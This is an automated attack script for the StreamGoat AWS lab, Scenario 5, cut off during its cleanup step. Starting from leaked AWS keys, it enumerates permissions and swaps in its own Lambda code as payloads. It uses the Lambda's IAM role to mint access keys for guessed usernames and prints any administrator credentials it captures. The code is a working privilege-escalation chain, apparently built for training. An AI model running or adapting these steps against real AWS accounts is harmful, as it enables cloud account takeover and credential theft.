#!/usr/bin/env bash
set -euo pipefail

#############################################
# Pretty TUI: colors, banner, spinner, utils
#############################################

if [ -t 1 ] && [ -z "${NO_COLOR:-}" ]; then
  if command -v tput >/dev/null 2>&1 && [ "$(tput colors 2>/dev/null || echo 0)" -ge 8 ]; then
    RED="$(tput setaf 1)"; GREEN="$(tput setaf 2)"; YELLOW="$(tput setaf 3)"; BLUE="$(tput setaf 4)"
    MAGENTA="$(tput setaf 5)"; CYAN="$(tput setaf 6)"; BOLD="$(tput bold)"; RESET="$(tput sgr0)"
  else
    RED=$'\033[31m'; GREEN=$'\033[32m'; YELLOW=$'\033[33m'; BLUE=$'\033[34m'
    MAGENTA=$'\033[35m'; CYAN=$'\033[36m'; BOLD=$'\033[1m'; RESET=$'\033[0m'
  fi
else
  RED=""; GREEN=""; YELLOW=""; BLUE=""; MAGENTA=""; CYAN=""; BOLD=""; RESET=""
fi

step() { printf "\n[%s] %s[*]%s %s\n" "$(date +%H:%M:%S)" "${YELLOW}" "${RESET}" "$*"; }
ok()   { printf "[%s] %s[OK]%s  %s\n" "$(date +%H:%M:%S)" "${GREEN}" "${RESET}" "$*"; }
err()  { printf "[%s] %s[ERR]%s %s\n" "$(date +%H:%M:%S)" "${RED}" "${RESET}" "$*"; }
info() { printf "%s[i]%s   %s\n"  "${BLUE}"   "${RESET}" "$*"; }

printf "%s%s%s\n" "${BOLD}${GREEN}" "  ________  ___  _____          __     " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" " / ___/ _ \/ _ \/ ___/__  ___ _/ /_    " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "/ /__/ // / , _/ (_ / _ \/ _ \`/ __/   " "${RESET}"
printf "%s%s%s\n" "${BOLD}${GREEN}" "\\___/____/_/|_|\\___/\\___/\\_,_/\\__/" "${RESET}"
printf "\n"

SPIN_PID=""
spin_start() {
  local msg="$*"
  printf "%s[>] %s%s " "${MAGENTA}" "${msg}" "${RESET}"
  ( while :; do
      for c in '⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏'; do
        printf "\r%s[>] %s%s %s" "${MAGENTA}" "${msg}" "${RESET}" "$c"
        sleep 0.08
      done
    done ) & SPIN_PID=$!
  disown || true
}
spin_stop() { [ -n "${SPIN_PID}" ] && kill "${SPIN_PID}" >/dev/null 2>&1 || true; SPIN_PID=""; printf "\r%*s\r" 120 ""; }

banner() {
  printf "%s%s%s\n" "${BOLD}${CYAN}" "===            StreamGoat - Scenario 5              ===" "${RESET}"
  printf "%sThis automated attack script will:%s\n" "${GREEN}" "${RESET}"
  printf "  • Step 1. Configuring aws credentials\n"
  printf "  • Step 2. Permission enumeration for leaked credentials\n"
  printf "  • Step 3. Inspect IAM user policies for owned user\n"
  printf "  • Step 4. Enumerating Lambda functions\n"
  printf "  • Step 5. Modify Lambda to enumerate under its role\n"
  printf "  • Step 6. Lambda Create/Delete tests (User/Group/Policy/Role)\n"
  printf "  • Step 7. CreateAccessKey guessing via Lambda\n"
  printf "  • Step 8. Validate captured keys; detect admin\n"
  printf "  • Step 9. Cleanup\n"
  
}
banner

#############################################
# Preflight checks (no changes to your logic)
#############################################
step "Preflight checks"
missing=0
for c in aws curl jq zip; do
  if ! command -v "$c" >/dev/null 2>&1; then err "Missing dependency: $c"; missing=1; fi
done
[ "$missing" -eq 0 ] && ok "All required tools present" || { err "Install missing tools and re-run"; exit 2; }

read -r -p "Everything is prepared. Press Enter to start (or Ctrl+C to abort)..." _ || true
#############################################
# Step 1. Configuring aws credentials
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 1. Configuring aws credentials to use awscli  ===" "${RESET}"
is_valid_keys() {
  local key="$1" secret="$2" token="${3:-}" region="${4:-us-east-1}"
  local rc=0 out

  # 1) Ensure no env creds override our profile
  unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN AWS_PROFILE AWS_DEFAULT_PROFILE
  PROFILE="streamgoat-scenario-5"
  
  # 2) Write creds to a dedicated profile (avoid clobbering 'default')
  aws configure set aws_access_key_id     "$key"    --profile "$PROFILE"
  aws configure set aws_secret_access_key "$secret" --profile "$PROFILE"
  aws configure set region                "$region" --profile "$PROFILE"

  # 3) Force the call to use our profile
  spin_start "Validating credentials via STS"
  out=$(aws sts get-caller-identity --profile "$PROFILE" --output json 2>&1) || rc=$?
  spin_stop


  if [ "$rc" -ne 0 ]; then
    return 1
  fi

  ok "STS OK → $(printf "%s" "$out" | jq -r '.Arn')"

  return 0
}

step "Starting point configuration"
while :; do
  read -r -p "Enter leaked AWS key: " AWSKEY_USER
  read -r -p "Enter leaked AWS secret: " AWSSECRET_USER; printf "\n"
  if is_valid_keys "$AWSKEY_USER" "$AWSSECRET_USER" "us-east-1"; then
    ok "Keys are valid. STS validation via ${YELLOW}'aws sts get-caller-identity'${RESET} successful"
    break
  else
    err "Not valid keys. STS validation via ${YELLOW}'aws sts get-caller-identity'${RESET} failed"
  fi
done
printf "\n"
read -r -p "Step 1 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true
#############################################
# Step 2. Permission enumeration for leaked credentials
#############################################
printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 2. Permission enumeration for leaked credentials  ===" "${RESET}"

# init colors (portable)

try() {
  local desc="$1"; shift
  local rc
  set +e
  "$@" >/dev/null 2>&1
  rc=$?
  set -e
  if [ $rc -eq 0 ]; then
    printf "[%s] %s[OK]%s    %s\n" "$(date +%H:%M:%S)" "$GREEN" "$RESET" "$desc"
  else
    printf "[%s] %s[DENY]%s  %s\n" "$(date +%H:%M:%S)" "$RED" "$RESET" "$desc"
  fi
}

# Identity/context
try "STS GetCallerIdentity" aws sts get-caller-identity --profile "$PROFILE"
try "IAM List Roles"  aws iam list-roles --profile "$PROFILE"

# Inventory
try "EC2 DescribeInstances" aws ec2 describe-instances --max-items 5 --profile "$PROFILE"
try "S3 ListAllMyBuckets"   aws s3api list-buckets --profile "$PROFILE"
try "Secrets ListSecrets"   aws secretsmanager list-secrets --max-results 5 --profile "$PROFILE"
try "SSM GetParametersByPath /" aws ssm get-parameters-by-path --path / --max-results 5 --profile "$PROFILE"
try "SSM DescribeInstances" aws ssm describe-instance-information --profile "$PROFILE"
try "KMS ListKeys"          aws kms list-keys --limit 5 --profile "$PROFILE"
try "ECR DescribeRepos"     aws ecr describe-repositories --max-results 5 --profile "$PROFILE"
try "Lambda ListFunctions"  aws lambda list-functions --max-items 5 --profile "$PROFILE"
try "DDB ListTables"        aws dynamodb list-tables --max-items 5 --profile "$PROFILE"
try "RDS DescribeDBs"       aws rds describe-db-instances --max-records 20 --profile "$PROFILE"
try "Logs DescribeLogGroups" aws logs describe-log-groups --limit 5 --profile "$PROFILE"
try "CloudTrail DescribeTrails" aws cloudtrail describe-trails --profile "$PROFILE"

printf "\nOK, we can list Lambda which looks interesting but let's try to get some more info about our user...\n"
printf "\n"
read -r -p "Step 2 is completed. Press Enter to proceed (or Ctrl+C to abort)..." _ || true

#############################################
# Step 3. Inspect IAM user policies for neo
#############################################
printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 3. Inspecting IAM policies for compromised user  ===" "${RESET}"

# 1. Get current IAM username
USERNAME=$(aws iam get-user --profile "$PROFILE" --query 'User.UserName' --output text 2>/dev/null)
if [ -z "$USERNAME" ]; then
  err "Unable to determine username (iam:GetUser failed?)"
  exit 1
fi
ok "Identified user: ${YELLOW}${USERNAME}${RESET}"

# 2. List inline policies
info "Inline policies attached to $USERNAME:"
INLINE_POLICY_NAMES=$(aws iam list-user-policies --user-name "$USERNAME" --profile "$PROFILE" --query 'PolicyNames' --output text 2>/dev/null)
if [ -n "$INLINE_POLICY_NAMES" ]; then
  echo "$INLINE_POLICY_NAMES" | tr '\t' '\n'
else
  info "(none)"
fi

# 3. Dump inline policy documents (if any)
if [ -n "$INLINE_POLICY_NAMES" ]; then
  for policy in $INLINE_POLICY_NAMES; do
    info "Retrieving inline policy document: $policy"
    aws iam get-user-policy --user-name "$USERNAME" --policy-name "$policy" --profile "$PROFILE" --output json | jq || err "Access denied"
  done
fi

printf "\nIt shows that we may perform any operations against Lambdas. Lets see on next step what lambdas do we have...\n"
printf "\n"
read -r -p "Step 3 is completed. Press Enter to proceed to Lambda enumeration (or Ctrl+C to abort)..." _ || true

#############################################
# Step 4. Lambda enumeration + source code
#############################################
printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 4. Lambda Enumeration and Source Code Extraction  ===" "${RESET}"

# List all functions
LAMBDA_LIST=$(aws lambda list-functions --profile "$PROFILE" --query 'Functions[*].FunctionName' --output text 2>/dev/null)

if [ -z "$LAMBDA_LIST" ]; then
  err "Could not list Lambda functions or none found"
  exit 1
fi

# Look for functions matching the lab pattern
TARGET_FUNCTIONS=$(echo "$LAMBDA_LIST" | tr '\t' '\n' | grep -E '^StreamGoat-Lambda-')

if [ -z "$TARGET_FUNCTIONS" ]; then
  err "No matching StreamGoat-Lambda-* functions found"
  exit 1
fi

ok "Available Lambda functions (lab scenario only):"
echo "$TARGET_FUNCTIONS" | sed 's/^/  -> /'

cd /tmp && mkdir -p streamgoat-scenario5-lambdadump

for FUNC in $TARGET_FUNCTIONS; do
  step "Inspecting Lambda function: $FUNC"

  # Get function metadata and code URL
  FUNC_META=$(aws lambda get-function --function-name "$FUNC" --profile "$PROFILE" --output json 2>/dev/null)
  if [ -z "$FUNC_META" ]; then
    err "Access denied or function does not exist: $FUNC"
    continue
  fi

  CODE_URL=$(echo "$FUNC_META" | jq -r '.Code.Location')

  if [ -z "$CODE_URL" ] || [ "$CODE_URL" == "null" ]; then
    err "No downloadable code URL for $FUNC"
    continue
  fi

  FILE_ZIP="streamgoat-scenario5-lambdadump/${FUNC}.zip"
  FILE_DIR="streamgoat-scenario5-lambdadump/${FUNC}"

  # Download the deployment package
  spin_start "Downloading deployment package"
  curl -s -L -o "$FILE_ZIP" "$CODE_URL" || err "Failed to download code"
  spin_stop && ok "Downloaded: $FILE_ZIP"

  # Extract contents
  mkdir -p "$FILE_DIR"
  unzip -q "$FILE_ZIP" -d "$FILE_DIR" && ok "Extracted to $FILE_DIR" || err "Failed to unzip"

  # Preview main file(s)
  echo "${BLUE}Previewing extracted source (first 20 lines):${RESET}"
  head -n 20 "$FILE_DIR"/index.py 2>/dev/null || echo "(no index.py found)"

done

rm -rf /tmp/streamgoat-scenario5-lambdadump
cd - > /dev/null
printf "\n\nWith ${YELLOW}lambda:*${RESET} we may modify configuration of the lambda. Lets upload the new code which will enumerate Lambda's privileges the same way we did on step 2.\n"
printf "\n"
read -r -p "Step 4 is completed. Press Enter to continue to exploitation... " _ || true

#############################################
# Step 5. Modify Lambda to enumerate under its role
#############################################
printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 5. Modifying Lambda to run baseline enumeration  ===" "${RESET}"

# Choose target Lambda (first StreamGoat-Lambda-*). You can override via env FUNC.
if [ -z "${FUNC:-}" ]; then
  FUNC=$(aws lambda list-functions --profile "$PROFILE" \
          --query 'Functions[*].FunctionName' --output text 2>/dev/null \
        | tr '\t' '\n' | grep -E '^StreamGoat-Lambda-' | head -n 1)
fi

if [ -z "$FUNC" ]; then
  err "No StreamGoat-Lambda-* found to modify."
  exit 1
fi
ok "Target Lambda: ${YELLOW}${FUNC}${RESET}"

# Ensure we have a workspace
cd /tmp
WORKDIR="$(mktemp -d -t sg-lambda-XXXXXX)"
ZIPFILE="${WORKDIR}/payload.zip"
PYFILE="${WORKDIR}/index.py"

# Write replacement Lambda handler (enumeration under Lambda role)
cat > "$PYFILE" <<'PYCODE'
import json
import boto3
from botocore.exceptions import BotoCoreError, ClientError

def _try_call(desc, client_name, method_name, kwargs=None):
    kwargs = kwargs or {}
    resp = {"ok": "[DENY]", "desc": desc, "error": None, "code": None, "summary": None}
    try:
        client = boto3.client(client_name)
        method = getattr(client, method_name)
        out = method(**kwargs)
        # Trim noisy payloads with small summaries
        if client_name == "iam" and method_name == "list_roles":
            resp["summary"] = f"roles={len(out.get('Roles', []))}"
        elif client_name == "ec2" and method_name == "describe_instances":
            count = sum(len(r.get("Instances", [])) for r in out.get("Reservations", []))
            resp["summary"] = f"instances={count}"
        elif client_name == "s3" and method_name == "list_buckets":
            resp["summary"] = f"buckets={len(out.get('Buckets', []))}"
        elif client_name == "secretsmanager" and method_name == "list_secrets":
            resp["summary"] = f"secrets={len(out.get('SecretList', []))}"
        elif client_name == "ssm" and method_name == "get_parameters_by_path":
            resp["summary"] = f"params={len(out.get('Parameters', []))}"
        elif client_name == "ssm" and method_name == "describe_instance_information":
            resp["summary"] = f"managed_instances={len(out.get('InstanceInformationList', []))}"
        elif client_name == "kms" and method_name == "list_keys":
            resp["summary"] = f"keys={len(out.get('Keys', []))}"
        elif client_name == "ecr" and method_name == "describe_repositories":
            resp["summary"] = f"repos={len(out.get('repositories', out.get('Repositories', [])))}"
        elif client_name == "lambda" and method_name == "list_functions":
            resp["summary"] = f"functions={len(out.get('Functions', []))}"
        elif client_name == "dynamodb" and method_name == "list_tables":
            resp["summary"] = f"tables={len(out.get('TableNames', []))}"
        elif client_name == "rds" and method_name == "describe_db_instances":
            resp["summary"] = f"db_instances={len(out.get('DBInstances', []))}"
        elif client_name == "logs" and method_name == "describe_log_groups":
            resp["summary"] = f"log_groups={len(out.get('logGroups', []))}"
        elif client_name == "cloudtrail" and method_name == "describe_trails":
            resp["summary"] = f"trails={len(out.get('trailList', []))}"
        resp["ok"] = "[OK]"
        return resp
    except ClientError as e:
        resp["error"] = str(e)
        resp["code"] = e.response.get("Error", {}).get("Code")
        return resp
    except BotoCoreError as e:
        resp["error"] = str(e)
        return resp
    except Exception as e:
        resp["error"] = str(e)
        return resp

def handler(event, context):
    # Mirroring your Step 2 checks
    checks = [
        ("IAM List Roles",            "iam",        "list_roles",                    {}),
        ("EC2 DescribeInstances",     "ec2",        "describe_instances",            {"MaxResults": 5}),
        ("S3 ListAllMyBuckets",       "s3",         "list_buckets",                  {}),
        ("Secrets ListSecrets",       "secretsmanager","list_secrets",               {"MaxResults": 5}),
        ("SSM GetParametersByPath /", "ssm",        "get_parameters_by_path",       {"Path": "/", "MaxResults": 5, "Recursive": False}),
        ("SSM DescribeInstances",     "ssm",        "describe_instance_information", {}),
        ("KMS ListKeys",              "kms",        "list_keys",                     {"Limit": 5}),
        ("ECR DescribeRepos",         "ecr",        "describe_repositories",        {"maxResults": 5}),
        ("Lambda ListFunctions",      "lambda",     "list_functions",               {"MaxItems": 5}),
        ("DDB ListTables",            "dynamodb",   "list_tables",                  {"Limit": 5}),
        ("RDS DescribeDBs",           "rds",        "describe_db_instances",        {"MaxRecords": 20}),
        ("Logs DescribeLogGroups",    "logs",       "describe_log_groups",          {"limit": 5}),
        ("CloudTrail DescribeTrails", "cloudtrail", "describe_trails",               {}),
    ]

    results = []
    for desc, client, method, kwargs in checks:
        results.append(_try_call(desc, client, method, kwargs))

    return {
        "version": "streamgoat-s5-enum-v1",
        "results": results
    }
PYCODE

# Package -> zip (flat)
cd "$WORKDIR" && zip -q -r "$(basename "$ZIPFILE")" "index.py"
ok "Prepared malicious payload: ${ZIPFILE}"
cd /tmp

spin_start "Uploading modified code to Lambda..."
# Make sure Lambda timeout is long enough (60s) for many API calls
aws lambda update-function-configuration \
  --function-name "$FUNC" \
  --timeout 60 \
  --profile "$PROFILE" >/dev/null

sleep 30

# Upload new code
aws lambda update-function-code \
  --function-name "$FUNC" \
  --zip-file "fileb://${ZIPFILE}" \
  --profile "$PROFILE" >/dev/null

sleep 30
spin_stop

ok "Code uploaded"

# Invoke and capture output
RESP_FILE="${WORKDIR}/invoke-output.json"
step "Invoking Lambda: $FUNC"
spin_start "Invoking Lambda..."
aws lambda invoke \
  --function-name "$FUNC" \
  --payload '{}' \
  --cli-binary-format raw-in-base64-out \
  --profile "$PROFILE" \
  "$RESP_FILE" >/dev/null || true
sleep 60
spin_stop

# Show result payload
if [ -s "$RESP_FILE" ]; then
  ok "Lambda invocation result (raw): ${RESP_FILE}"
  if command -v jq >/dev/null 2>&1; then
    jq -r '
      .results[] |
      "\(.ok|tostring)\t\(.desc)\t\(.summary // "-")\t\(.code // "-")"
    ' "$RESP_FILE" | awk -F'\t' '{printf "%-5s  %-30s\n", $1, $2}'
  else
    cat "$RESP_FILE"
  fi
else
  err "No output received from Lambda (file empty). Check CloudWatch logs."
fi

cd /tmp
rm -rf "$WORKDIR"
cd - > /dev/null
printf "\nIt seems Lambda doesn't have any specific permission set on it. However if we get back the original content of the Lambda, we may notice it was set to create User and Group. What if the Lambda has iam:Create* permissions set? Lets verify.\n"
printf "\n"
read -r -p "Step 5 is completed. Press Enter to continue to exploitation... " _ || true
#############################################
# Step 6. Lambda Create/Delete tests (User/Group/Policy/Role)
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 6. Validating assumption of having iam:Create*  ===" "${RESET}"

# Pick target Lambda (first StreamGoat-Lambda-*) unless FUNC is preset
if [ -z "${FUNC:-}" ]; then
  FUNC=$(aws lambda list-functions --profile "$PROFILE" \
          --query 'Functions[*].FunctionName' --output text 2>/dev/null \
        | tr '\t' '\n' | grep -E '^StreamGoat-Lambda-' | head -n 1)
fi
[ -z "$FUNC" ] && { err "No StreamGoat-Lambda-* found."; exit 1; }
ok "Target Lambda: ${YELLOW}${FUNC}${RESET}"

cd /tmp
WORKDIR="$(mktemp -d -t sg-lambda-create-XXXXXX)"
ZIPFILE="${WORKDIR}/payload.zip"
PYFILE="${WORKDIR}/index.py"

# Replacement Lambda code:
# - Creates user/group/policy/role with 'StreagGoat-' prefixes
# - Records HTTPStatusCode or AWS error code
# - If create succeeds, attempts delete (will fail if role lacks iam:Delete*)
cat > "$PYFILE" <<'PYCODE'
import json
import boto3
import random
import string
from botocore.exceptions import ClientError

def _rand(n=6):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=n))

def _create_then_cleanup_user(iam):
    name = f"StreagGoat-User-{_rand()}"
    ok = False
    try:
        iam.create_user(UserName=name)
        ok = True
    except ClientError:
        ok = False
    # cleanup if created
    if ok:
        try:
            iam.delete_user(UserName=name)
        except Exception:
            pass
    return {"kind": "User", "ok": ok}

def _create_then_cleanup_group(iam):
    name = f"StreagGoat-Group-{_rand()}"
    ok = False
    try:
        iam.create_group(GroupName=name)
        ok = True
    except ClientError:
        ok = False
    if ok:
        try:
            iam.delete_group(GroupName=name)
        except Exception:
            pass
    return {"kind": "Group", "ok": ok}

def _create_then_cleanup_policy(iam):
    name = f"StreagGoat-Policy-{_rand()}"
    doc = {
        "Version": "2012-10-17",
        "Statement": [{"Effect": "Allow", "Action": ["sts:GetCallerIdentity"], "Resource": "*"}]
    }
    ok = False
    arn = None
    try:
        resp = iam.create_policy(PolicyName=name, PolicyDocument=json.dumps(doc))
        arn = resp.get("Policy", {}).get("Arn")
        ok = True
    except ClientError:
        ok = False
    if ok and arn:
        try:
            iam.delete_policy(PolicyArn=arn)
        except Exception:
            pass
    return {"kind": "Policy", "ok": ok}

def _create_then_cleanup_role(iam, account_id):
    name = f"StreagGoat-Role-{_rand()}"
    trust = {
        "Version": "2012-10-17",
        "Statement": [{
            "Effect": "Allow",
            "Principal": {"AWS": f"arn:aws:iam::{account_id}:root"},
            "Action": "sts:AssumeRole"
        }]
    }
    ok = False
    try:
        iam.create_role(RoleName=name, AssumeRolePolicyDocument=json.dumps(trust))
        ok = True
    except ClientError:
        ok = False
    if ok:
        try:
            iam.delete_role(RoleName=name)
        except Exception:
            pass
    return {"kind": "Role", "ok": ok}

def handler(event, context):
    iam = boto3.client('iam')
    sts = boto3.client('sts')
    account_id = sts.get_caller_identity()["Account"]

    results = []
    results.append(_create_then_cleanup_user(iam))
    results.append(_create_then_cleanup_group(iam))
    results.append(_create_then_cleanup_policy(iam))
    results.append(_create_then_cleanup_role(iam, account_id))

    return {"version": "streamgoat-s6-create-v2", "results": results}
PYCODE

# Zip payload
cd "$WORKDIR" && zip -q -r "$(basename "$ZIPFILE")" "index.py"
ok "Prepared payload: ${ZIPFILE}"
cd /tmp

# Upload new code
spin_start "Uploading modified code to Lambda..."
aws lambda update-function-code \
  --function-name "$FUNC" \
  --zip-file "fileb://${ZIPFILE}" \
  --profile "$PROFILE" >/dev/null
sleep 60
spin_stop
ok "Code uploaded"

# Invoke and capture output
RESP_FILE="${WORKDIR}/invoke-create-output.json"
spin_start "Invoking Lambda..."
aws lambda invoke \
  --function-name "$FUNC" \
  --payload '{}' \
  --cli-binary-format raw-in-base64-out \
  --profile "$PROFILE" \
  "$RESP_FILE" >/dev/null || true
sleep 60
spin_stop

# Show results in [OK]/[DENY] format
if [ -s "$RESP_FILE" ]; then
  ok "Lambda invocation result (raw): ${RESP_FILE}"
  if command -v jq >/dev/null 2>&1; then
    jq -r '.results[] | (if .ok then "[OK]  " else "[DENY]  " end) + (.kind + " creation")' "$RESP_FILE"
  else
    # minimal fallback without jq
    cat "$RESP_FILE"
  fi
else
  err "No output received from Lambda (file empty). Check CloudWatch logs."
fi

cd /tmp
rm -rf "$WORKDIR"
cd - > /dev/null

printf "\nWe see some good result we may use. We see that not only User creation and group Creaton is allowed for Lambda, but Roles and Policies as well. It can make us thinking we have wildcard permissions set ${YELLOW}iam:Create*${RESET}. But unfortunately user we own doesn't have permissions to list existing users. Lambda doesn't have this permissions either. So what we can do? We can try performing operation of CreateAccessKey on guessed users based on format we know (StreamGoat-User-). If operation successful - we will receive new keys to pivot further.\n"
printf "\n"
read -r -p "Step 6 is completed. Press Enter to continue to exploitation... " _ || true
#############################################
# Step 7. CreateAccessKey guessing via Lambda
#############################################
printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 7. Attempting iam:CreateAccessKey on guessed users ===" "${RESET}"

# Target Lambda
if [ -z "${FUNC:-}" ]; then
  FUNC=$(aws lambda list-functions --profile "$PROFILE" \
          --query 'Functions[*].FunctionName' --output text 2>/dev/null \
        | tr '\t' '\n' | grep -E '^StreamGoat-Lambda-' | head -n 1)
fi
[ -z "$FUNC" ] && { err "No StreamGoat-Lambda-* found."; exit 1; }
ok "Target Lambda: ${YELLOW}${FUNC}${RESET}"

cd /tmp
WORKDIR="$(mktemp -d -t sg-lambda-keys-XXXXXX)"
ZIPFILE="${WORKDIR}/payload.zip"
PYFILE="${WORKDIR}/index.py"

# Lambda code: try CreateAccessKey on 20 candidates
cat > "$PYFILE" <<'PYCODE'
import json
import boto3
from botocore.exceptions import ClientError

def handler(event, context):
    iam = boto3.client('iam')
    candidates = [
        "ava", "linda", "john",
        "dmitry", "anna", "mike", "sophia", "daniel",
        "emily", "victor", "maria", "kevin", "nina",
        "liam", "olivia", "ethan", "peter", "noah",
        "mia", "alex"
    ]
    results = []
    for name in candidates:
        username = f"StreamGoat-User-{name}"
        entry = {"user": username, "ok": False}
        try:
            resp = iam.create_access_key(UserName=username)
            ak = resp.get("AccessKey", {})
            entry["ok"] = True
            entry["access_key_id"] = ak.get("AccessKeyId")
            entry["secret_access_key"] = ak.get("SecretAccessKey")
        except ClientError as e:
            entry["error"] = e.response.get("Error", {}).get("Code", "ClientError")
        except Exception as e:
            entry["error"] = str(e)
        results.append(entry)
    return {"version": "streamgoat-s7-create-keys-v1", "attempts": results}
PYCODE

# Package and deploy
cd "$WORKDIR" && zip -q -r "$(basename "$ZIPFILE")" "index.py"
ok "Prepared payload: ${ZIPFILE}"

spin_start "Uploading modified code to Lambda"
aws lambda update-function-code \
  --function-name "$FUNC" \
  --zip-file "fileb://${ZIPFILE}" \
  --profile "$PROFILE" >/dev/null
sleep 60
spin_stop
ok "Code uploaded"

cd /tmp
RESP_FILE="${WORKDIR}/invoke-keys-output.json"
step "Invoking Lambda: $FUNC"
spin_start "Invoking Lambda..."
aws lambda invoke \
  --function-name "$FUNC" \
  --payload '{}' \
  --cli-binary-format raw-in-base64-out \
  --profile "$PROFILE" \
  "$RESP_FILE" >/dev/null || true
sleep 60
spin_stop

# Output parsing
printf "%s[*]%s Generating AccessKeys for:\n" "${YELLOW}" "${RESET}"

SUCCESS_KEYS_FILE="/tmp/streamgoat-captured-keys.txt"
: > "$SUCCESS_KEYS_FILE"

if command -v jq >/dev/null 2>&1 && [ -s "$RESP_FILE" ]; then
  jq -c '.attempts[]' "$RESP_FILE" | while IFS= read -r line; do
    user=$(printf "%s" "$line" | jq -r '.user')
    okflag=$(printf "%s" "$line" | jq -r '.ok')
    if [ "$okflag" = "true" ]; then
      kid=$(printf "%s" "$line" | jq -r '.access_key_id')
      sec=$(printf "%s" "$line" | jq -r '.secret_access_key')
      printf "[OK] %s:\nAWS key: %s\nAWS secret: %s\n" "$user" "$kid" "$sec"
      echo "$user|$kid|$sec" >> "$SUCCESS_KEYS_FILE"
    else
      printf "[DENY] %s\n" "$user"
    fi
  done
else
  err "Failed to parse Lambda output; raw follows:"
  cat "$RESP_FILE" || true
fi


# Show stored credentials summary
KEY_COUNT=$(wc -l < "$SUCCESS_KEYS_FILE" || echo 0)
if [ "$KEY_COUNT" -gt 0 ]; then
  echo
  ok "Stored credentials for $KEY_COUNT user(s):"
  while IFS='|' read -r user kid secret; do
    printf "  %s -> KEY_ID=%s SECRET=%s\n" "$user" "$kid" "$secret"
  done < "$SUCCESS_KEYS_FILE"
else
  info "No credentials captured."
fi

cd /tmp
rm -rf "$WORKDIR"
cd - > /dev/null

printf "\nTrying to guess username via creating of AccessKeys we were able to identify 3 users! Now lets use them to auth and check their permissions.\n"
printf "\n"
read -r -p "Step 7 is completed. Press Enter to cleanup access keys... " _ || true

#############################################
# Step 8. Validate captured keys and check for admin
#############################################
printf "\n%s%s%s\n" "${BOLD}${CYAN}" "===  Step 8. Validating captured keys and checking privileges  ===" "${RESET}"

if [ ! -s "$SUCCESS_KEYS_FILE" ]; then
  err "No captured credentials to validate. Run Step 7 first."
  return 0 2>/dev/null || exit 0
fi

# Save original creds for restoration
ORIG_KEY="$(aws configure get aws_access_key_id --profile "$PROFILE" 2>/dev/null || true)"
ORIG_SECRET="$(aws configure get aws_secret_access_key --profile "$PROFILE" 2>/dev/null || true)"

# Temp file to record admins we discover
ADMIN_KEYS_FILE="/tmp/streamgoat-admin-keys.txt"
: > "$ADMIN_KEYS_FILE"

# Loop over each captured credential
while IFS='|' read -r USERNAME KEY SECRET; do
  step "Testing credentials for ${YELLOW}${USERNAME}${RESET}"

  aws configure set aws_access_key_id     "$KEY" --profile "$PROFILE"
  aws configure set aws_secret_access_key "$SECRET" --profile "$PROFILE"
  sleep 2

  # STS Identity
  ID_OUT="$(aws sts get-caller-identity --profile "$PROFILE" --output json 2>/dev/null)" || ID_OUT=""
  if [ -n "$ID_OUT" ]; then
    ARN="$(printf "%s" "$ID_OUT" | jq -r '.Arn' 2>/dev/null || echo '(unknown ARN)')"
    ok "STS identity: ${ARN}"
  else
    err "STS failed for $USERNAME — skipping further checks."
    continue
  fi

  # Confirm resolved IAM user
  IAM_NAME="$(aws iam get-user --profile "$PROFILE" --query 'User.UserName' --output text 2>/dev/null || true)"
  if [ -z "$IAM_NAME" ] || [ "$IAM_NAME" = "None" ]; then
    IAM_NAME="$USERNAME"
  fi
  info "UserName: ${IAM_NAME}"

  # List inline policies
  INLINE_LIST="$(aws iam list-user-policies --user-name "$IAM_NAME" --profile "$PROFILE" --query 'PolicyNames' --output text 2>/dev/null || true)"
  if [ -n "$INLINE_LIST" ]; then
    ok "Inline policies:"
    echo "$INLINE_LIST" | tr '\t' '\n' | sed 's/^/  - /'
  else
    info "Inline policies: (none or access denied)"
  fi

  # List attached managed policies
  ATTACHED_NAMES="$(aws iam list-attached-user-policies --user-name "$IAM_NAME" --profile "$PROFILE" --query 'AttachedPolicies[*].PolicyName' --output text 2>/dev/null || true)"
  if [ -n "$ATTACHED_NAMES" ]; then
    ok "Attached policies:"
    echo "$ATTACHED_NAMES" | tr '\t' '\n' | sed 's/^/  - /'
  else
    info "Attached policies: (none or access denied)"
  fi

  # Check for admin policy
  if printf "%s" "$ATTACHED_NAMES" | grep -qE '\bAdministratorAccess\b'; then
    printf "%s*** ADMIN DETECTED ***%s %s\n" "${BOLD}${GREEN}" "${RESET}" "$IAM_NAME"
    echo "$IAM_NAME|$KEY|$SECRET" >> "$ADMIN_KEYS_FILE"
  fi

  echo
done < "$SUCCESS_KEYS_FILE"

# Restore original creds
step "Restoring original profile credentials"
if [ -n "$ORIG_KEY" ] && [ -n "$ORIG_SECRET" ]; then
  aws configure set aws_access_key_id     "$ORIG_KEY"    --profile "$PROFILE"
  aws configure set aws_secret_access_key "$ORIG_SECRET" --profile "$PROFILE"
  ok "Profile ${PROFILE} restored"
else
  info "No original creds were saved; profile left with last tested credentials."
fi

# Summary
echo
printf "%s=== Validation Summary ===%s\n" "${BOLD}${GREEN}" "${RESET}"
if [ -s "$ADMIN_KEYS_FILE" ]; then
  ADMIN_COUNT=$(wc -l < "$ADMIN_KEYS_FILE")
  ok "Admin users identified: $ADMIN_COUNT"
  while IFS='|' read -r NAME KEY SECRET; do
    printf "  %s -> KEY_ID=%s SECRET=%s\n" "$NAME" "$KEY" "$SECRET"
  done < "$ADMIN_KEYS_FILE"
else
  info "No admin users detected among captured keys."
fi

printf "\nAnd we have a user with full admin privileges! Congratulations!\n"
printf "\n"
read -r -p "Step 8 is completed. Press Enter to cleanup access keys... " _ || true

#############################################
# Step 9. Cleanup created access keys (admin-assisted)
#############################################
printf "\n%s%s%s\n\n" "${BOLD}${CYAN}" "===  Step 9. Cleanup created access keys (admin-assisted) ===" "${RESET}"

# Sanity checks
if [ ! -s "$SUCCESS_KEYS_FILE" ]; then
  info "No captured keys found. Nothing to clean up."
